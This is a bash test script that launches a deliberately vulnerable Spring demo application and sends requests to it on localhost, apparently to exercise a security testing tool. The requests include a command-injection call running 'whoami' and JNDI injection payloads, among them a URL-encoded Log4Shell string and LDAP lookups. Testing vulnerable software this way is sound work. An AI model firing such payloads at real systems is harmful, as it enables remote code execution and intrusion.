source ~/.bash_profile

echo "run SpringVulExample"
nohup java -jar target/SpringVulExample.jar &

echo "waiting for application run"
check_times=0
while [ $check_times -lt 30 ];
do
	echo 'checking api status...'
	curl http://localhost:8080/index/name?username=owefsad
	if [ "$?" == "0" ];then
		break
	else
		let check_times++
		echo "api status is down, retry $check_times times after 10s..."
		sleep 10
	fi
done

echo "run api testing..."
curl http://localhost:8080/index/name?username=owefsad
curl http://localhost:8080/index/age?age=100
curl http://localhost:8080/cmd/runtime?cmd=whoami

echo "run jndi testing"
curl http://localhost:8080/jndi/log4j2-error?name=%24%7Bjndi%3Aldap%3A%2F%2Fowefsad%7D
curl http://localhost:8080/jndi/dnsURLContext?name=ldap://localhost:2145
curl http://localhost:8080/jndi/ReadOnlyContext?name=ldap://localhost:2145
curl http://localhost:8080/jndi/JdbcRowSetImpl?name=ldap://localhost:2145

if [ "$?" == "0" ];then
		echo "test finished. wait for upload report"
		sleep 30
else
  echo "api status is down"
fi

